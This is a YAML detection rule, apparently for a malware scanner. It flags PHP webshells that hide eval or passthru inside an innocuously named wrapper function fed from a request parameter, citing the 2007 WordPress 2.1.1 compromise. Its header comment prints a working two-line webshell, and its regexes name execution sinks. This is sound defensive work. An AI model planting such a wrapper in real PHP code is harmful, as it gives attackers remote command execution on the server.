# A one-line webshell split across a wrapper function.
#
#   function comment_text_phpfilter($filterdata) { eval($filterdata); }
#   if ($_GET["ix"]) { comment_text_phpfilter($_GET["ix"]); }
#
# Neither half looks like `eval($_GET['x'])`, which is what the direct-input
# rules search for: the sink takes a parameter, and the call site passes a
# superglobal to an innocuously named local function. The WordPress 2.1.1
# release compromise of 2007 shipped two of these, one wrapping `eval` and one
# wrapping `passthru`, with names borrowed from the surrounding core file.
#
# The pairing is what convicts, and it survives any renaming: a function whose
# whole body is a code- or command-execution sink, plus a request value handed
# to a local function under a request-presence test.
defaults:
  platforms: [unix, windows]
  for: [php, text]
  attack: T1505.003,T1059.006
  mbc: B0030

traits:
  - id: function-body-is-execution-sink
    desc: Function body is only an exec sink
    crit: suspicious
    conf: 0.94
    if:
      type: text
      regex: 'function \w{1,32}\(\$\w{1,20}\)\s*\{\s*(eval|passthru|shell_exec)\(\$\w{1,20}\)'

  - id: request-value-to-local-function
    desc: Request value passed to a local function
    crit: notable
    conf: 0.9
    if:
      type: text
      regex: '\$_(GET|POST|REQUEST)\s*\[[^\]]{1,30}\]\)\s*\{\s*\w{1,40}\(\s*\$_[A-Z]{3,7}\['

composite_rules:
  - id: wrapped-request-execution-backdoor
    desc: Wrapper function executes request input
    crit: hostile
    conf: 0.97
    all:
      - id: function-body-is-execution-sink
      - id: request-value-to-local-function
